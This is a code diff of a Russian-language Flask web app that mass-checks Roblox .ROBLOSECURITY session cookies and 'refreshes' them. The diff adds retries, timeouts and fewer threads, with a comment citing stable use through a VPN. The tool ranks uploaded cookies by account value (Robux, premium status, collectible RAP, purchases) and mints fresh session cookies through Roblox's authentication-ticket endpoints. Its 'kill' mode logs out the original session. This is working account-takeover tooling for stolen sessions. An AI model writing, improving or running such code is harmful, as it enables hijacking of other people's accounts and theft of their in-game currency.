@@ -159,7 +159,7 @@ HTML = r"""<!DOCTYPE html>
                 </div>
             </div>
             <div class="card">
-                <h2>📦 Массовая проверка (10 Потоков)</h2>
+                <h2>📦 Массовая проверка (6 Потоков)</h2>
                 <div class="upload-area" id="massDropArea" onclick="document.getElementById('massFile').click()">
                     <p style="font-weight:700;">📁 Перетащите TXT файл с куками</p>
                     <p style="font-size:11px;color:var(--text-muted);margin-top:4px;">или нажмите для выбора</p>
@@ -178,7 +178,7 @@ HTML = r"""<!DOCTYPE html>
     </div>
     <div class="tab-content" id="tab-fresher">
         <div class="card">
-            <h2>🔄 Обновление сессий (10 Потоков)</h2>
+            <h2>🔄 Обновление сессий (6 Потоков)</h2>
             <div style="display:flex;gap:12px;margin-bottom:14px;align-items:center;flex-wrap:wrap;">
                 <span style="font-size:13px;font-weight:700;color:var(--text-muted);">Режим:</span>
                 <button class="btn btn-secondary btn-sm fresher-mode-btn active-mode" id="btnDup" onclick="setFresherMode('duplicate')">♻️ Дублировать</button>
@@ -296,9 +296,14 @@ async function runSingleCheck() {
     document.getElementById('singleResult').style.display = 'block';
     document.getElementById('btnToggle_singleResult').textContent = '▼ Свернуть';
     document.getElementById('singleResult').textContent = '⏳ Проверка...';
-    var res = await fetch('/api/single-check', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({cookie: cookie}) });
-    var data = await res.json();
-    document.getElementById('singleResult').textContent = data.report || 'Ошибка';
+    try {
+        var res = await fetch('/api/single-check', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({cookie: cookie}) });
+        var data = await res.json();
+        document.getElementById('singleResult').textContent = data.report || 'Ошибка';
+    } catch(e) {
+        showAlert('Ошибка соединения');
+        document.getElementById('singleResult').textContent = '❌ Ошибка сети';
+    }
 }
 
 async function runMassCheck() {
@@ -324,8 +329,17 @@ async function runMassCheck() {
     var fd = new FormData();
     fd.append('file', file);
     
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 90000); // 90 сек таймаут
+    
     try {
-        var res = await fetch('/api/mass-check', { method: 'POST', body: fd });
+        var res = await fetch('/api/mass-check', { 
+            method: 'POST', 
+            body: fd,
+            signal: controller.signal
+        });
+        clearTimeout(timeoutId);
+        
         var data = await res.json();
         
         progress.style.width = '100%';
@@ -345,9 +359,15 @@ async function runMassCheck() {
             showAlert(data.message || 'Ошибка');
         }
     } catch(e) {
-        showAlert('Ошибка соединения');
+        clearTimeout(timeoutId);
+        if (e.name === 'AbortError') {
+            showAlert('Превышено время ожидания ответа от сервера');
+        } else {
+            showAlert('Ошибка соединения');
+        }
         btn.disabled = false;
         btn.textContent = '🚀 Запустить массовый чек';
+        progressText.textContent = '❌ Ошибка';
     }
 }
 
@@ -381,38 +401,51 @@ async function runFresher() {
     document.getElementById('fresherResult').style.display = 'block';
     document.getElementById('btnToggle_fresherResult').textContent = '▼ Свернуть';
     document.getElementById('fresherResult').textContent = '⏳ Обновление...';
-    var res = await fetch('/api/fresher', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({cookies: cookies, mode: mode}) });
-    var data = await res.json();
-    document.getElementById('fresherResult').textContent = data.only_cookies || 'Ошибка';
+    try {
+        var res = await fetch('/api/fresher', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({cookies: cookies, mode: mode}) });
+        var data = await res.json();
+        document.getElementById('fresherResult').textContent = data.only_cookies || 'Ошибка';
+    } catch(e) {
+        showAlert('Ошибка соединения');
+        document.getElementById('fresherResult').textContent = '❌ Ошибка сети';
+    }
 }
 
 async function loadCheckerHistory() {
-    var res = await fetch('/api/history/checker');
-    var data = await res.json();
-    var html = '';
-    data.history.slice().reverse().forEach(function(i, idx) {
-        var resultsText = i.results ? i.results.join('\n\n') : 'Нет результатов';
-        var usernames = i.usernames && i.usernames.length ? i.usernames.join(', ') : 'Неизвестно';
-        var boxId = 'chk_hist_' + idx;
-        var fileName = 'checker_history_' + i.timestamp.replace(/[:. ]/g, '_') + '.txt';
-        html += '<div class="history-card"><div class="history-header"><span>🕒 ' + i.timestamp + ' (' + (i.type === 'single' ? 'Одиночная' : 'Массовая') + ') — Валид: ' + i.valid + '/' + i.total + '</span><div class="action-btn-group"><button class="btn-download-txt" onclick="downloadTxtFromBox(\'' + boxId + '\', \'' + fileName + '\')">📥 TXT</button><button class="btn-toggle-box" id="btnToggle_' + boxId + '" onclick="toggleBox(\'' + boxId + '\')">▶ Развернуть</button></div></div><div class="history-users">👤 Аккаунты: ' + usernames + '</div><div class="result-box" id="' + boxId + '" style="display:none;">' + resultsText + '</div></div>';
-    });
-    document.getElementById('checkerHistoryList').innerHTML = html || 'История пуста';
+    try {
+        var res = await fetch('/api/history/checker');
+        var data = await res.json();
+        var html = '';
+        data.history.slice().reverse().forEach(function(i, idx) {
+            var resultsText = i.results ? i.results.join('\n\n') : 'Нет результатов';
+            var usernames = i.usernames && i.usernames.length ? i.usernames.join(', ') : 'Неизвестно';
+            var boxId = 'chk_hist_' + idx;
+            var fileName = 'checker_history_' + i.timestamp.replace(/[:. ]/g, '_') + '.txt';
+            html += '<div class="history-card"><div class="history-header"><span>🕒 ' + i.timestamp + ' (' + (i.type === 'single' ? 'Одиночная' : 'Массовая') + ') — Валид: ' + i.valid + '/' + i.total + '</span><div class="action-btn-group"><button class="btn-download-txt" onclick="downloadTxtFromBox(\'' + boxId + '\', \'' + fileName + '\')">📥 TXT</button><button class="btn-toggle-box" id="btnToggle_' + boxId + '" onclick="toggleBox(\'' + boxId + '\')">▶ Развернуть</button></div></div><div class="history-users">👤 Аккаунты: ' + usernames + '</div><div class="result-box" id="' + boxId + '" style="display:none;">' + resultsText + '</div></div>';
+        });
+        document.getElementById('checkerHistoryList').innerHTML = html || 'История пуста';
+    } catch(e) {
+        document.getElementById('checkerHistoryList').innerHTML = 'Ошибка загрузки истории';
+    }
 }
 
 async function loadFresherHistory() {
-    var res = await fetch('/api/history/fresher');
-    var data = await res.json();
-    var html = '';
-    data.history.slice().reverse().forEach(function(i, idx) {
-        var cookiesText = i.cookies ? i.cookies.join('\n') : 'Нет кук';
-        var usernames = i.usernames && i.usernames.length ? i.usernames.join(', ') : 'Неизвестно';
-        var boxId = 'frs_hist_' + idx;
-        var modeTitle = i.mode === 'kill' ? '💀 Убийство' : '♻️ Дублирование';
-        var fileName = 'fresher_history_' + i.timestamp.replace(/[:. ]/g, '_') + '.txt';
-        html += '<div class="history-card"><div class="history-header"><span>🕒 ' + i.timestamp + ' (' + modeTitle + ') — Обновлено: ' + i.refreshed_count + ' шт.</span><div class="action-btn-group"><button class="btn-download-txt" onclick="downloadTxtFromBox(\'' + boxId + '\', \'' + fileName + '\')">📥 TXT</button><button class="btn-toggle-box" id="btnToggle_' + boxId + '" onclick="toggleBox(\'' + boxId + '\')">▶ Развернуть</button></div></div><div class="history-users">👤 Аккаунты: ' + usernames + '</div><div class="result-box" id="' + boxId + '" style="display:none;">' + cookiesText + '</div></div>';
-    });
-    document.getElementById('fresherHistoryList').innerHTML = html || 'История пуста';
+    try {
+        var res = await fetch('/api/history/fresher');
+        var data = await res.json();
+        var html = '';
+        data.history.slice().reverse().forEach(function(i, idx) {
+            var cookiesText = i.cookies ? i.cookies.join('\n') : 'Нет кук';
+            var usernames = i.usernames && i.usernames.length ? i.usernames.join(', ') : 'Неизвестно';
+            var boxId = 'frs_hist_' + idx;
+            var modeTitle = i.mode === 'kill' ? '💀 Убийство' : '♻️ Дублирование';
+            var fileName = 'fresher_history_' + i.timestamp.replace(/[:. ]/g, '_') + '.txt';
+            html += '<div class="history-card"><div class="history-header"><span>🕒 ' + i.timestamp + ' (' + modeTitle + ') — Обновлено: ' + i.refreshed_count + ' шт.</span><div class="action-btn-group"><button class="btn-download-txt" onclick="downloadTxtFromBox(\'' + boxId + '\', \'' + fileName + '\')">📥 TXT</button><button class="btn-toggle-box" id="btnToggle_' + boxId + '" onclick="toggleBox(\'' + boxId + '\')">▶ Развернуть</button></div></div><div class="history-users">👤 Аккаунты: ' + usernames + '</div><div class="result-box" id="' + boxId + '" style="display:none;">' + cookiesText + '</div></div>';
+        });
+        document.getElementById('fresherHistoryList').innerHTML = html || 'История пуста';
+    } catch(e) {
+        document.getElementById('fresherHistoryList').innerHTML = 'Ошибка загрузки истории';
+    }
 }
 
 async function clearCheckerHistory() {
@@ -532,6 +565,27 @@ def clean_cookie(cookie_str):
             return match.group(1)
     return cookie_str
 
+# ==================== НАДЕЖНЫЙ ЗАПРОС С RETRY ====================
+def make_roblox_request(url, headers, method="GET", json_data=None, timeout=12, retries=3):
+    """
+    Выполняет HTTP-запрос с автоматическими повторными попытками (Retry) и таймаутами.
+    """
+    session = requests.Session()
+    for attempt in range(retries):
+        try:
+            if method.upper() == "POST":
+                r = session.post(url, headers=headers, json=json_data, timeout=timeout)
+            else:
+                r = session.get(url, headers=headers, timeout=timeout)
+            return r
+        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+            if attempt == retries - 1:
+                return None
+            time.sleep(1)
+        except Exception:
+            return None
+    return None
+
 # ==================== ПОЛУЧЕНИЕ ПОКУПОК ====================
 def get_all_purchases(user_id, cookie):
     headers = {"Cookie": f".ROBLOSECURITY={cookie}", "User-Agent": "Mozilla/5.0"}
@@ -543,8 +597,9 @@ def get_all_purchases(user_id, cookie):
             url = f"https://economy.roblox.com/v2/users/{user_id}/transactions?limit=100&transactionType=Purchase"
             if cursor:
                 url += f"&cursor={cursor}"
-            r = requests.get(url, headers=headers, timeout=10)
-            if r.status_code != 200:
+            
+            r = make_roblox_request(url, headers=headers, timeout=12, retries=2)
+            if not r or r.status_code != 200:
                 break
             data = r.json()
             for item in data.get('data', []):
@@ -560,7 +615,7 @@ def get_all_purchases(user_id, cookie):
             cursor = data.get('nextPageCursor')
             if not cursor:
                 break
-    except:
+    except Exception:
         pass
     return purchases_by_game, total_spent
 
@@ -631,51 +686,55 @@ def format_single_report(info):
 
 # ==================== ПОЛУЧЕНИЕ ДАННЫХ АККАУНТА ====================
 def get_account_data(cookie):
-    cookie = clean_cookie(cookie)
-    headers = {"Cookie": f".ROBLOSECURITY={cookie}", "User-Agent": "Mozilla/5.0"}
-    
-    # 1. Проверка куки
-    res_user = requests.get("https://users.roblox.com/v1/users/authenticated", headers=headers, timeout=10)
-    if res_user.status_code != 200:
+    try:
+        cookie = clean_cookie(cookie)
+        headers = {"Cookie": f".ROBLOSECURITY={cookie}", "User-Agent": "Mozilla/5.0"}
+        
+        # 1. Проверка куки (увеличенный таймаут и retry)
+        res_user = make_roblox_request("https://users.roblox.com/v1/users/authenticated", headers=headers, timeout=15, retries=3)
+        if not res_user or res_user.status_code != 200:
+            return None
+        user_data = res_user.json()
+        user_id = user_data.get("id")
+        username = user_data.get("name")
+        display_name = user_data.get("displayName")
+        
+        # 2. Robux
+        robux = 0
+        res_robux = make_roblox_request(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers=headers, timeout=10, retries=2)
+        if res_robux and res_robux.status_code == 200:
+            robux = res_robux.json().get("robux", 0)
+        
+        # 3. Premium и дата
+        is_premium = False
+        created_date = "N/A"
+        res_details = make_roblox_request(f"https://users.roblox.com/v1/users/{user_id}", headers=headers, timeout=10, retries=2)
+        if res_details and res_details.status_code == 200:
+            dt = res_details.json()
+            is_premium = dt.get("isPremium", False)
+            created_str = dt.get("created", "")
+            if created_str:
+                created_date = created_str.split("T")[0]
+        
+        # 4. RAP
+        rap = 0
+        res_rap = make_roblox_request(f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?limit=100", headers=headers, timeout=12, retries=2)
+        if res_rap and res_rap.status_code == 200:
+            data = res_rap.json().get("data", [])
+            rap = sum(item.get("recentAveragePrice", 0) for item in data)
+        
+        # 5. Геймпассы
+        game_purchases, total_spent = get_all_purchases(user_id, cookie)
+        
+        return {
+            "user_id": user_id, "username": username, "display_name": display_name,
+            "robux": robux, "pending_robux": 0, "credit": "0.00",
+            "is_premium": is_premium, "created_date": created_date, "rap": rap,
+            "cookie": cookie, "game_purchases": game_purchases, "game_total_spent": total_spent
+        }
+    except Exception as e:
+        print(f"Ошибка проверки аккаунта: {e}")
         return None
-    user_data = res_user.json()
-    user_id = user_data.get("id")
-    username = user_data.get("name")
-    display_name = user_data.get("displayName")
-    
-    # 2. Robux
-    robux = 0
-    res_robux = requests.get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers=headers, timeout=8)
-    if res_robux.status_code == 200:
-        robux = res_robux.json().get("robux", 0)
-    
-    # 3. Premium и дата
-    is_premium = False
-    created_date = "N/A"
-    res_details = requests.get(f"https://users.roblox.com/v1/users/{user_id}", headers=headers, timeout=8)
-    if res_details.status_code == 200:
-        dt = res_details.json()
-        is_premium = dt.get("isPremium", False)
-        created_str = dt.get("created", "")
-        if created_str:
-            created_date = created_str.split("T")[0]
-    
-    # 4. RAP
-    rap = 0
-    res_rap = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?limit=100", headers=headers, timeout=10)
-    if res_rap.status_code == 200:
-        data = res_rap.json().get("data", [])
-        rap = sum(item.get("recentAveragePrice", 0) for item in data)
-    
-    # 5. Геймпассы
-    game_purchases, total_spent = get_all_purchases(user_id, cookie)
-    
-    return {
-        "user_id": user_id, "username": username, "display_name": display_name,
-        "robux": robux, "pending_robux": 0, "credit": "0.00",
-        "is_premium": is_premium, "created_date": created_date, "rap": rap,
-        "cookie": cookie, "game_purchases": game_purchases, "game_total_spent": total_spent
-    }
 
 # ==================== ФРЕШЕР (MEOW TOOL) ====================
 def refresh_cookie_action(cookie, mode="duplicate"):
@@ -687,24 +746,27 @@ def refresh_cookie_action(cookie, mode="duplicate"):
             c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
         cookies_dict = {'.ROBLOSECURITY': c}
         headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'Accept': 'application/json, text/plain, */*'}
-        check_r = requests.get('https://users.roblox.com/v1/users/authenticated', cookies=cookies_dict, headers=headers, timeout=10)
-        if check_r.status_code != 200:
+        check_r = make_roblox_request('https://users.roblox.com/v1/users/authenticated', headers=headers, timeout=12, retries=2)
+        if not check_r or check_r.status_code != 200:
             result['error'] = "Кука невалидна"
             return result
         user_data = check_r.json()
         result['username'] = user_data.get('name', '?')
         result['user_id'] = user_data.get('id', '?')
-        csrf_r = requests.post('https://auth.roblox.com/v2/logout', cookies=cookies_dict, headers={'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'}, timeout=10)
+        
+        csrf_r = requests.post('https://auth.roblox.com/v2/logout', cookies=cookies_dict, headers={'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'}, timeout=12)
         csrf_token = csrf_r.headers.get('x-csrf-token')
         if not csrf_token:
             result['error'] = "CSRF token not found"
             return result
+            
         ticket_headers = {'User-Agent': 'Mozilla/5.0', 'RBXauthenticationNegotiation': '1', 'Referer': 'https://www.roblox.com/', 'X-CSRF-Token': csrf_token, 'Content-Type': 'application/json'}
         ticket_r = requests.post('https://auth.roblox.com/v1/authentication-ticket', headers=ticket_headers, cookies=cookies_dict, json={}, timeout=15)
         auth_ticket = ticket_r.headers.get('rbx-authentication-ticket')
         if not auth_ticket:
             result['error'] = "Auth ticket not found"
             return result
+            
         redeem_headers = {'User-Agent': 'Mozilla/5.0', 'RBXauthenticationNegotiation': '1', 'Content-Type': 'application/json'}
         redeem_r = requests.post('https://auth.roblox.com/v1/authentication-ticket/redeem', headers=redeem_headers, json={"authenticationTicket": auth_ticket}, timeout=15)
         new_cookie = None
@@ -721,15 +783,17 @@ def refresh_cookie_action(cookie, mode="duplicate"):
         if not new_cookie:
             result['error'] = "New cookie not found"
             return result
+            
         if mode == "kill":
             try:
                 kill_headers = {'User-Agent': 'Mozilla/5.0', 'X-CSRF-Token': csrf_token, 'Content-Type': 'application/json'}
                 requests.post('https://auth.roblox.com/v2/logout', headers=kill_headers, cookies=cookies_dict, timeout=10)
             except:
                 pass
+                
         test_s = requests.Session()
         test_s.headers.update({'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'})
-        test_r = test_s.get('https://users.roblox.com/v1/users/authenticated', cookies={'.ROBLOSECURITY': new_cookie}, timeout=10)
+        test_r = test_s.get('https://users.roblox.com/v1/users/authenticated', cookies={'.ROBLOSECURITY': new_cookie}, timeout=12)
         if test_r.status_code == 200 and 'id' in test_r.json():
             result['new_cookie'] = new_cookie
             result['success'] = True
@@ -771,6 +835,7 @@ def mass_check():
     cookies = [line.strip() for line in content.splitlines() if line.strip()]
     if not cookies:
         return jsonify({"success": False, "message": "Файл пуст"})
+        
     total = len(cookies)
     valid_count = 0
     total_robux = 0
@@ -778,18 +843,22 @@ def mass_check():
     usernames = []
     full_reports = []
     
-    with ThreadPoolExecutor(max_workers=10) as executor:
+    # Уменьшено число рабочих потоков до 6 для стабильной работы через VPN
+    with ThreadPoolExecutor(max_workers=6) as executor:
         future_to_cookie = {executor.submit(get_account_data, c): c for c in cookies}
         for future in as_completed(future_to_cookie):
-            info = future.result()
-            if info:
-                valid_count += 1
-                total_robux += info["robux"]
-                if info["is_premium"]:
-                    premium_count += 1
-                usernames.append(info["username"])
-                rep = format_single_report(info)
-                full_reports.append(rep)
+            try:
+                info = future.result()
+                if info:
+                    valid_count += 1
+                    total_robux += info["robux"]
+                    if info["is_premium"]:
+                        premium_count += 1
+                    usernames.append(info["username"])
+                    rep = format_single_report(info)
+                    full_reports.append(rep)
+            except Exception as exc:
+                print(f"Поток упал с ошибкой: {exc}")
     
     summary = f"""📊 ОТЧЁТ О ПРОВЕРКЕ
 ══════════════════════════════════════════════════════
@@ -802,6 +871,7 @@ def mass_check():
 
 ========================================
 """ + "\n\n".join(full_reports)
+
     save_checker_history_entry("mass", valid_count, total, usernames, full_reports)
     return jsonify({
         "success": True,
@@ -837,15 +907,19 @@ def run_fresher_api():
         return jsonify({"only_cookies": "Ошибка: Пустой ввод"})
     refreshed = []
     usernames = []
-    with ThreadPoolExecutor(max_workers=10) as executor:
+    with ThreadPoolExecutor(max_workers=6) as executor:
         futures = [executor.submit(refresh_cookie_simple, c, mode) for c in cookies]
         for f in as_completed(futures):
-            res = f.result()
-            if res:
-                refreshed.append(res)
-                info = get_account_data(res)
-                if info:
-                    usernames.append(info['username'])
+            try:
+                res = f.result()
+                if res:
+                    refreshed.append(res)
+                    info = get_account_data(res)
+                    if info:
+                        usernames.append(info['username'])
+            except Exception as e:
+                print(f"Ошибка фрешера: {e}")
+                
     save_fresher_history_entry(mode, len(refreshed), usernames, refreshed)
     return jsonify({"only_cookies": "\n".join(refreshed)})
 
